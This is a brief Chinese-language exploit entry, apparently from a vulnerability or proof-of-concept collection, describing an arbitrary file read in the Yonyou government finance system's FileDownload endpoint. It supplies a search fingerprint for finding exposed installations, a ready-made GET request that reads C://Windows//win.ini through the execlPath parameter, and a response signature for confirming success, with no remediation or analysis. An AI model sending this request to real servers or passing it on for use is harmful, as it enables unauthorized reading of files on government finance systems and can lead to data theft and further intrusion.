# 用友政务财务系统FileDownload任意文件读取漏洞

用友 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`app="用友-政务财务系统"`
- **请求**：`GET /bg/attach/FileDownload?execlPath=C://Windows//win.ini HTTP/1.1`
- **响应特征**：200 support